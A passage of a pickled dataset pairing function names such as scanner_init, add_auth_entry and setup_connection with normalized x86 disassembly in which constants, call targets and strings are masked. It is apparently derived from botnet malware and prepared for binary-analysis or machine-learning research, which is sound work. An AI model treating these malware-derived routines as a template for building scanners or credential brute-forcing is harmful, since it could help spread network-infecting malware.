EDX]\nTEST~AL,AL\nJNZ~FOO\nADD~EBX,ECX\nLEA~ECX,[EDI+EBX]\nJMP~FOO\nMOV~EAX,[EDX+0]\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nMOV~EAX,[ESP]\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nINC~EDX\nCMP~EBX,0\nADC~ESI,0\nJMP~FOO\nINC~EDX\nCMP~ECX,0\nADC~EBX,0\nJMP~FOO\nCMP~[ESI+0],0\nJNZ~FOO\nMOV~DX,[ESI+0]\nMOV~EAX,EDX\nROR~AX,0\nCMP~AX,0\nJZ~FOO\nROR~DX,0\nMOV~EAX,EDX\nAND~EAX,0\nLEA~ECX,[EDI+EAX]\nJMP~FOO\nMOV~AL,[ESI+0]\nXOR~EBX,EBX\nMOV~[ESP+0],AL\nMOV~AL,[EDI+0]\nMOV~[ESP+0],AL\nMOV~AL,[EDI+0]\nMOV~[ESP+0],AL\nMOV~AL,[EDI+0]\nMOV~[ESP+0],AL\nPUSH~EAX\nPUSH~EAX\nXOR~EAX,EAX\nMOV~EDX,[ESP+0]\nMOV~AL,[EDX]\nLEA~EAX,<STR>\nPUSH~EAX\nMOV~EAX,[EDX+0]\nPUSH~EAX\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~DL,[ECX]\nMOV~[ECX+0],EAX\nMOV~BL,DL\nMOV~ECX,[ESP+0]\nINC~EDX\nMOV~[EAX+EBX*4],ECX\nMOV~EAX,[ESP+0]\nADD~ESP,0\nMOV~[EAX],DL\nMOV~DX,[ESI+0]\nJMP~FOO"'
p107
L1181L
tp108
a(S'scanner_kill'
p109
S'"SUB~ESP,0\nMOV~EAX,<STR>\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nRETN"'
p110
L20L
tp111
a(S'setup_connection'
p112
S'"PUSH~EBX\nMOV~EBX,EAX\nSUB~ESP,0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~EAX,[EAX+0]\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~[EBX+0],EAX\nINC~EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~0\nMOV~[EBX+0],0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,[EBX+0]\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~ECX,[EBX+0]\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~ECX\nCALL~FOO\nMOV~EAX,[EBX+0]\nMOV~[ESP+0],0\nMOV~[ESP+0],EAX\nMOV~EAX,[EBX+0]\nMOV~[ESP+0],AX\nMOV~EAX,<STR>\nMOV~[EBX+0],EAX\nLEA~EAX,[ESP+0]\nADD~ESP,0\nMOV~EDX,[EBX+0]\nMOV~[EBX+0],0\nPUSH~0\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nRETN"'
p113
L200L
tp114
a(S'add_auth_entry'
p115
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,EAX\nMOV~EAX,<STR>\nSHL~EAX,0\nMOV~[ESP+0],EDX\nADD~EAX,0\nMOV~EDX,<STR>\nMOV~[ESP+0],CX\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~<STR>,EAX\nMOV~EAX,<STR>\nMOV~[ESP],ESI\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~EBP,EAX\nLEA~EBX,[EAX+0]\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nPUSH~EBX\nPUSH~ESI\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EBP,EBP\nJLE~FOO\nXOR~EAX,EAX\nXOR~BYTEPTR[EAX+EDI],0\nINC~EAX\nCMP~EBP,EAX\nJNZ~FOO\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nSHL~EAX,0\nMOV~[ESP+0],EAX\nMOV~EAX,<STR>\nSHL~EAX,0\nMOV~EDX,[ESP+0]\nMOV~[EDX+ECX],EDI\nMOV~EDX,<STR>\nMOV~ECX,EBP\nMOV~[EAX+EDX+0],CL\nMOV~EAX,<STR>\nMOV~EBP,<STR>\nMOV~[ESP+0],EAX\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EDI,EAX\nLEA~EBX,[EAX+0]\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nMOV~ESI,EAX\nPUSH~EBX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EDI,EDI\nJLE~FOO\nXOR~EAX,EAX\nLEA~ESI,[ESI+0]\nXOR~BYTEPTR[EAX+ESI],0\nINC~EAX\nCMP~EDI,EAX\nJNZ~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,<STR>\nSHL~EBP,0\nMOV~ECX,EDI\nSHL~EAX,0\nMOV~[EBP+EDX+0],ESI\nMOV~EDX,<STR>\nMOV~[EAX+EDX+0],CL\nMOV~EDX,<STR>\nMOV~EBX,<STR>\nMOV~ECX,EDX\nMOV~AX,<STR>\nSHL~ECX,0\nINC~EDX\nMOV~<STR>,EDX\nMOV~[ECX+EBX+0],AX\nMOV~AX,[ESP+0]\nADD~AX,<STR>\nMOV~[ECX+EBX+0],AX\nMOV~<STR>,AX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p116
L330L
tp117
a(S'scanner_init'
p118
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nCALL~FOO\nMOV~<STR>,EAX\nTEST~EAX,EAX\nJLE~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nINC~EAX\nJZ~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~<STR>,EAX\nCALL~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~<STR>,EAX\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],0\nMOV~ECX,EAX\nMOV~<STR>,EAX\nADD~ESP,0\nXOR~EAX,EAX\nLEA~EDX,[ECX+0]\nLEA~EAX,[EAX+EAX*8]\nINC~EBX\nSHL~EAX,0\nMOV~DWORDPTR[EDX],0\nADD~EDX,0\nCMP~EBX,0\nMOV~[EAX+ECX+0],0\nMOV~EAX,EBX\nJLE~FOO\nMOV~[ESP+0],0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,EAX\nCMP~EAX,0\nJZ~FOO\nPUSH~EBP\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nMOV~EDI,<STR>\nPUSH~EAX\nPUSH~0\nPUSH~EDI\nCALL~FOO\nLEA~EAX,[ESP+0]\nMOV~ESI,<STR>\nMOV~[ESP+0],0\nMOV~DWORDPTR[ESP],0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP+0],AX\nROR~AX,0\nCMP~AX,0\nJBE~FOO\nMOV~<STR>,0\nMOV~<STR>,0\nCALL~FOO\nMOV~<STR>,0\nMOV~<STR>,AX\nMOV~AL,<STR>\nAND~EAX,0\nMOV~<STR>,0\nOR~EAX,0\nMOV~<STR>,0\nMOV~<STR>,BX\nMOV~<STR>,AL\nCALL~FOO\nMOV~ECX,0\nMOV~<STR>,AX\nMOV~EDX,0\nMOV~EAX,0\nOR~<STR>,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nMOV~ECX,0\nCALL~FOO\nLEA~EAX,[ESP+0]\nLEA~EDX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EDX\nMOV~ESI,<STR>\nCMP~[ESP+0],ESI\nJZ~FOO\nLEA~EBP,[ESP+0]\nMOV~[ESP+0],0\nJMP~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJA~FOO\nLEA~EAX,[ECX-0]\nCMP~AL,0\nJBE~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nXOR~EAX,EAX\nAND~EDX,0\nMOV~AL,BL\nMOV~<STR>,0\nSHL~EAX,0\nSHL~ECX,0\nSHL~EDX,0\nOR~ECX,EAX\nMOV~EAX,EDI\nAND~EAX,0\nOR~ECX,EAX\nOR~EDX,ECX\nPUSH~ECX\nROR~DX,0\nROR~EDX,0\nROR~DX,0\nPUSH~ECX\nMOV~<STR>,EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~<STR>,AX\nMOV~EAX,0\nMOV~ECX,EAX\nMOV~EAX,EDX\nSAR~EDX,0\nADD~ESP,0\nIDIV~,ECX\nTEST~EDX,EDX\nJNZ~FOO\nMOV~<STR>,0\nMOV~EAX,<STR>\nPUSH~0\nMOV~<STR>,EAX\nPUSH~0\nMOV~<STR>,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~<STR>,AX\nMOV~EAX,<STR>\nMOV~[ESP+0],EAX\nMOV~AX,<STR>\nMOV~[ESP+0],0\nMOV~[ESP+0],AX\nPOP~EAX\nMOV~EAX,<STR>\nPOP~EDX\nPUSH~0\nPUSH~EBP\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nCALL~FOO\nMOV~<STR>,AX\nMOV~EAX,<STR>\nMOV~<STR>,EAX\nCALL~FOO\nMOV~EBX,EAX\nMOV~EDX,EAX\nMOV~EDI,EAX\nMOV~CL,AL\nSHR~EBX,0\nSHR~EDX,0\nSHR~EDI,0\nCMP~AL,0\nJZ~FOO\nTEST~AL,AL\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nLEA~EAX,[EAX-0]\nCMP~AL,0\nJBE~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJZ~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJBE~FOO\nCMP~BL,0\nJBE~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJBE~FOO\nCMP~BL,0\nJBE~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nCMP~BL,0\nJBE~FOO\nCMP~BL,0\nJBE~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJNZ~FOO\nJMP~FOO\nMOV~<STR>,0\nJMP~FOO\nMOV~[ESP+0],ESI\nCALL~FOO\nXOR~EBX,EBX\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~DWORDPTR[EAX],0\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nMOV~ESI,<STR>\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nMOV~ECX,[ESP+0]\nCMP~DWORDPTR[ECX],0\nJZ~FOO\nCMP~EAX,0\nJBE~FOO\nMOV~EAX,[ESP+0]\nCMP~EAX,<STR>\nJNZ~FOO\nCMP~[ESP+0],0\nJNZ~FOO\nMOV~ESI,[ESP+0]\nCMP~SI,0\nJZ~FOO\nCMP~SI,0\nJNZ~FOO\nMOV~AX,[ESP+0]\nCMP~AX,[ESP+0]\nJNZ~FOO\nMOV~AL,[ESP+0]\nTEST~AL,0\nJZ~FOO\nTEST~AL,0\nJZ~FOO\nTEST~AL,0\nJNZ~FOO\nTEST~AL,0\nJNZ~FOO\nMOV~EAX,[ESP+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nLEA~EDX,[EAX-0]\nROR~DX,0\nROR~EDX,0\nROR~DX,0\nCMP~[ESP+0],EDX\nJNZ~FOO\nCMP~EBX,0\nJG~FOO\nLEA~EAX,[EBX+EBX*8]\nMOV~ECX,<STR>\nSHL~EAX,0\nADD~EAX,ECX\nMOV~EBP,[EAX+0]\nLEA~ECX,[EAX+0]\nTEST~EBP,EBP\nJZ~FOO\nINC~EBX\nCMP~EBX,0\nJZ~FOO\nMOV~EAX,ECX\nLEA~ECX,[ECX+0]\nMOV~EDI,[EAX+0]\nTEST~EDI,EDI\nJNZ~FOO\nMOV~[EAX+0],EDX\nMOV~[EAX+0],SI\nCALL~FOO\nJMP~FOO\nMOV~EDX,0\nXOR~EAX,EAX\nMOV~ECX,EDX\nMOV~EDI,[ESP+0]\nCLD\nSTOSD~,\nMOV~ECX,EDX\nMOV~EDI,[ESP+0]\nCLD\nSTOSD~,\nXOR~EDI,EDI\nMOV~[ESP+0],0\nXOR~ESI,ESI\nLEA~EBX,[EAX+EAX*8]\nMOV~EAX,<STR>\nSHL~EBX,0\nMOV~ECX,0\nADD~EBX,EAX\nMOV~EDX,[EBX+0]\nCMP~EDX,0\nJBE~FOO\nMOV~EAX,<STR>\nMOV~EBP,[EBX+0]\nSUB~EAX,EBP\nCMP~EAX,ECX\nJA~FOO\nDEC~EDX\nJZ~FOO\nMOV~EAX,[EBX+0]\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[EBX+0]\nCMP~EDI,EAX\nJGE~FOO\nMOV~EDI,EAX\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nCMP~EAX,0\nJLE~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nCMP~EDI,ESI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nLEA~EDX,[ESP+0]\nMOV~EAX,EDI\nPUSH~EDX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nJGE~FOO\nMOV~EAX,ESI\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],0\nMOV~<STR>,EAX\nADD~ESP,0\nXOR~EAX,EAX\nLEA~EDI,[EAX+EAX*8]\nMOV~EAX,<STR>\nSHL~EDI,0\nADD~EDI,EAX\nMOV~ECX,[EDI+0]\nCMP~ECX,0\nJZ~FOO\nMOV~EAX,ECX\nMOV~EDX,ECX\nSHR~EDX,0\nAND~EAX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJNZ~FOO\nMOV~EAX,ECX\nSHR~ECX,0\nAND~EAX,0\nBT~[ESP+ECX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJNZ~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nCMP~EAX,0\nJLE~FOO\nJMP~FOO\nMOV~EAX,[EDI+0]\nDEC~EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~DL,[EAX+EDI+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nDEC~EAX\nJNZ~FOO\nMOV~EAX,[EDI+0]\nTEST~EAX,EAX\nJZ~FOO\nLEA~EAX,[EDI+0]\nMOV~[ESP+0],EAX\nCMP~[EDI+0],0\nJZ~FOO\nMOV~ECX,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~EAX,0\nMOV~DWORDPTR[ECX],0\nMOV~EDX,[EDI+0]\nPUSH~0\nADD~EBX,EDX\nSUB~EAX,EDX\nPUSH~EAX\nPUSH~EBX\nMOV~EBP,[EDI+0]\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJLE~FOO\nXOR~EDX,EDX\nCMP~BYTEPTR[EDX+EBX],0\nJNZ~FOO\nMOV~BYTEPTR[EDX+EBX],0\nINC~EDX\nCMP~EAX,EDX\nJNZ~FOO\nMOV~EBX,[EDI+0]\nADD~EBX,EAX\nMOV~EAX,<STR>\nMOV~[EDI+0],EBX\nMOV~[EDI+0],EAX\nCMP~[EDI+0],0\nJA~FOO\nMOV~EAX,[EDI+0]\nJMP~<STR>\nMOV~EBX,[ESP+0]\nXOR~EBP,EBP\nMOV~EDX,[EDI+0]\nCMP~EBP,EDX\nJGE~FOO\nCMP~BYTEPTR[EBX],0\nJNZ~FOO\nMOV~ECX,[ESP+0]\nLEA~ESI,[EBX+0]\nADD~ECX,EDX\nCMP~ECX,ESI\nJBE~FOO\nMOV~AL,[EBX+0]\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nLEA~EAX,[EBX+0]\nCMP~ECX,EAX\nJBE~FOO\nMOV~AL,[ESI]\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nMOV~AL,[EBX+0]\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nPUSH~0\nPUSH~0\nPUSH~EBX\nADD~EBP,0\nMOV~EDX,[EDI+0]\nADD~EBX,0\nPUSH~EDX\nCALL~FOO\nMOV~EDX,[EDI+0]\nADD~ESP,0\nCMP~EBP,EDX\nJL~FOO\nTEST~EBP,EBP\nJLE~FOO\nMOV~[EDI+0],0\nJMP~FOO\nMOV~ECX,[EDI+0]\nLEA~EAX,[ECX-0]\nTEST~EAX,EAX\nJLE~FOO\nMOV~DL,[EAX+EDI+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nDEC~EAX\nJNZ~FOO\nPUSH~0\nPUSH~0\nPUSH~ECX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nCMP~EAX,0\nJNZ~FOO\nPUSH~0\nPUSH~0\nMOV~EAX,[EDI+0]\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nCMP~EAX,0\nJNZ~FOO\nJMP~FOO\nMOV~ECX,[EDI+0]\nLEA~EAX,[ECX-0]\nTEST~EAX,EAX\nJLE~FOO\nMOV~DL,[EAX+EDI+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nDEC~EAX\nJNZ~FOO\nPUSH~0\nPUSH~0\nPUSH~ECX\nMOV~EBP,[ESP+0]\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nCMP~EAX,0\nJNZ~FOO\nJMP~FOO\nMOV~EAX,[EDI+0]\nDEC~EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~DL,[EAX+EDI+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nDEC~EAX\nJNZ~FOO\nJMP~FOO\nMOV~EAX,[EDI+0]\nDEC~EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~DL,[EAX+EDI+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nDEC~EAX\nJNZ~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nDEC~EDX\nPUSH~EDX\nPUSH~EAX\nMOV~EAX,[EDI+0]\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EBP\nPOP~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nDEC~EDX\nPUSH~EDX\nPUSH~EAX\nMOV~ESI,[EDI+0]\nPUSH~ESI\nMOV~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~EBP,0\nJZ~FOO\nTEST~EBP,EBP\nJLE~FOO\nMOV~EDX,[EDI]\nMOV~EAX,[EDI+0]\nMOV~[ESP+0],EDX\nMOV~EDX,[EDI+0]\nMOV~[ESP+0],EAX\nMOV~[ESP+0],DX\nCALL~FOO\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nMOV~ESI,[EDI+0]\nPUSH~ESI\nCALL~FOO\nMOV~[EDI+0],0\nMOV~[EDI+0],0\nADD~ESP,0\nMOV~EDX,[EDI+0]\nMOV~EAX,EDX\nCMP~EDX,EBP\nJLE~FOO\nMOV~EDX,EBP\nSUB~EAX,EDX\nMOV~[EDI+0],EAX\nPUSH~EBX\nPUSH~EAX\nMOV~EAX,[ESP+0]\nADD~EAX,EDX\nPUSH~EAX\nMOV~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,[EDI+0]\nDEC~EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~DL,[EAX+EDI+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nDEC~EAX\nJZ~FOO\nMOV~DL,[EAX+EDI+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nLEA~EBP,[EAX+0]\nCMP~EBP,0\nJZ~FOO\nTEST~EBP,EBP\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nMOV~ESI,[ESP+0]\nPUSH~ESI\nPUSH~EAX\nMOV~EBX,[EDI+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nMOV~ECX,[EDI+0]\nPUSH~ECX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nMOV~[EDI+0],0\nJMP~FOO\nMOV~EAX,[EDI+0]\nDEC~EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~DL,[EAX+EDI+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nDEC~EAX\nJNZ~FOO\nJMP~FOO\nADD~EBX,0\nADD~EBP,0\nJMP~FOO\nTEST~EBP,EBP\nJNZ~FOO\nJMP~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMO